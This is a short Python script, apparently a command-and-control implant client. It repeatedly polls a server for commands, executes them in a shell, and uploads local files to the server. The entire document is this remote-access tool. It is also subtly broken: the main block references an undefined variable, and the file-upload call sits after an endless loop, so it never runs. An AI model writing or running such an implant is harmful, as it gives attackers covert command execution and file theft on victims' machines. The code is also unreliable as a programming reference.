import requests
import subprocess
import time
import sys

def execute_command(command):
    try:
        result = subprocess.check_output(command, shell=True)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return str(e)

def beacon(serverIP):
    serverGetCommand = f'https://{serverIP}/get-command'
    
    while True:
        try:
            response = requests.get(serverGetCommand, verify='cert.pem')
            command = response.json().get('command', '')
            if command:
                print(f"Executing: {command}")
                result = execute_command(command)
                print(f"Result: {result}")
        except Exception as e:
            print(f"Error: {e}")
        time.sleep(5)

def upload_file(serverIP, filePath):
    serverUpload = f'https://{serverIP}/upload'
    
    try:
        with open(filePath, 'rb') as f:
            response = requests.post(serverUpload, files={'file': f}, verify='cert.pem')
            print(response.json())
    except Exception as e:
        print(f"Failed to upload file: {e}")

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage: python scholly_special_client.py <server-ip>")
        sys.exit(1)

    server_ip = sys.argv[1]
    beacon(serverIP)
    upload_file(serverIP, '/path/to/file')
